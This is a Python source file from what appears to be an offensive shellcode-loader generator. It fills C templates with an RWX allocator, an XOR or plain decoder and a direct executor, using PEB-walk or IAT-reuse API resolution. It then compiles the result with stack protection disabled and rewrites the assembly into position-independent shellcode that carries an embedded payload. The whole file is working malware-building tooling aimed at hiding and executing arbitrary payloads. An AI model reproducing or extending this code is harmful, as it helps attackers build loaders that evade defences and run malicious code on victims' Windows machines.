from helper import *
from config import config
import os
import pprint
from observer import observer
from jinja2 import Template

from project import project
from model import *

use_templates = True


def create_c_from_template():
    plugin_allocator = ""
    plugin_decoder = ""
    plugin_executor = ""

    with open("plugins/allocator/rwx_1.c", "r", encoding='utf-8') as file:
        plugin_allocator = file.read()

    if project.decoder_style == DecoderStyle.PLAIN_1:
        with open("plugins/decoder/plain_1.c", "r", encoding='utf-8') as file:
            plugin_decoder = file.read()
    elif project.decoder_style == DecoderStyle.XOR_1:
        with open("plugins/decoder/xor_1.c", "r", encoding='utf-8') as file:
            plugin_decoder = file.read()

    with open("plugins/executor/direct_1.c", "r", encoding='utf-8') as file:
        plugin_executor = file.read()

    
    if project.source_style == SourceStyle.peb_walk:
        if use_templates:
            with open("source/peb_walk/template.c", 'r', encoding='utf-8') as file:
                template_content = file.read()
                observer.add_text("main_c_template", template_content)

            template = Template(template_content)
            rendered_template = template.render({
                'plugin_allocator': plugin_allocator,
                'plugin_decoder': plugin_decoder,
                'plugin_executor': plugin_executor,
            })
            with open("build/main.c", "w", encoding='utf-8') as file:
                file.write(rendered_template)
                observer.add_text("main_c_rendered", rendered_template)

        else:
            observer.add_text("main_c", file_readall_text("source/peb_walk/main.c"))
            shutil.copy("source/peb_walk/main.c", "build/main.c")
            shutil.copy("source/peb_walk/peb_lookup.h", "build/peb_lookup.h")

    elif project.source_style == SourceStyle.iat_reuse:
        if use_templates:
            with open("source/iat_reuse/template.c", 'r', encoding='utf-8') as file:
                template_content = file.read()
                observer.add_text("main_c_template", template_content)
            template = Template(template_content)
            rendered_template = template.render({
                'plugin_allocator': plugin_allocator,
                'plugin_decoder': plugin_decoder,
                'plugin_executor': plugin_executor,
            })
            with open("build/main.c", "w", encoding='utf-8') as file:
                file.write(rendered_template)
                observer.add_text("main_c_rendered", rendered_template)
        else:
            observer.add_text("main_c", file_readall_text("source/iat_reuse/main.c"))
            shutil.copy("source/iat_reuse/main.c", "build/main.c")


def make_c_to_asm(c_file, asm_file, payload_len, capabilities: ExeCapabilities):
    print("--[ C to ASM: {} -> {} ]".format(c_file, asm_file))

    asm = {
        "initial": "",
        "templated": "",
        "cleanup": "",
        "fixup": "",
    }

    # 

    # Phase 1: C To Assembly
    print("---[ Make ASM from C: {} ]".format(c_file))
    run_process_checkret([
            config.get("path_cl"),
            "/c",
            "/FA",
            "/GS-",
            "/Fa{}/".format(os.path.dirname(c_file)),
            c_file,
    ])
    if not os.path.isfile(asm_file):
        print("Error: Compiling failed")
        return
    asm["initial"] = file_readall_text(asm_file)

    # Phase 1.2: Assembly fixup
    print("---[ Fixup  : {} ]".format(asm_file))
    if not fixup_asm_file(asm_file, payload_len, capabilities):
        print("Error: Fixup failed")
        return
    else:
        asm["fixup"] = file_readall_text(asm_file)

    # Phase 1.1: Assembly cleanup
    asm_clean_file = asm_file + ".clean"
    print("---[ Cleanup: {} ]".format(asm_file))
    run_process_checkret([
        config.get("path_masmshc"),
        asm_file,
        asm_clean_file,
    ])
    if not os.path.isfile(asm_clean_file):
        print("Error: Cleanup filed")
        return
    else:
        shutil.move(asm_clean_file, asm_file)
        asm["cleanup"] = file_readall_text(asm_file)

    return asm


def bytes_to_asm_db(byte_data):
    # Convert each byte to a string in hexadecimal format 
    # prefixed with '0' and suffixed with 'h'
    hex_values = [f"0{byte:02x}H" for byte in byte_data]
    formatted_string = ', '.join(hex_values)
    return "\tDB " + formatted_string


def fixup_asm_file(filename, payload_len, capabilities: ExeCapabilities):
    with open(filename, 'r', encoding='utf-8') as asmfile:
        lines = asmfile.readlines()

    # When it breaks, enable this
    #for idx, line in enumerate(lines):
    #    if "jmp\tSHORT" in lines[idx]:
    #        lines[idx] = lines[idx].replace("SHORT", "")

    # do IAT reuse
    for idx, line in enumerate(lines):
        # Remove EXTRN, we dont need it
        if "EXTRN	__imp_" in lines[idx]:
            lines[idx] = "; " + lines[idx]
            continue

        # Fix call
        if "call" in lines[idx] and "__imp_" in lines[idx]:
            func_name = lines[idx][lines[idx].find("__imp_")+6:].rstrip()
            exeCapability = capabilities.get(func_name)
            if exeCapability == None:
                print("Error Capabilities not: {}".format(func_name))
            else:
                randbytes: bytes = os.urandom(6)
                lines[idx] = bytes_to_asm_db(randbytes) + "\r\n"
                exeCapability.id = randbytes

                print("    > Replace func name: {} with {}".format(
                    func_name, randbytes))
        
    # replace external reference with shellcode reference
    for idx, line in enumerate(lines): 
        if "supermega_payload" in lines[idx]:
            print("    > Replace external reference at line: {}".format(idx))
            lines[idx] = lines[idx].replace(
                "mov	r8, QWORD PTR supermega_payload",
                "lea	r8, [shcstart]"
            )

    # replace payload length
    for idx, line in enumerate(lines): 
        if "11223344" in lines[idx]:
            print("    > Replace payload length at line: {}".format(idx))
            lines[idx] = lines[idx].replace("11223344", str(payload_len))
            break
            
    # add label at end of code
    for idx, line in enumerate(lines): 
        if lines[idx].startswith("END"):
            print("    > Add end of code label at line: {}".format(idx))
            lines.insert(idx-1, "shcstart:\r\n")
            break
    
    with open(filename, 'w') as asmfile:
        asmfile.writelines(lines)

    return True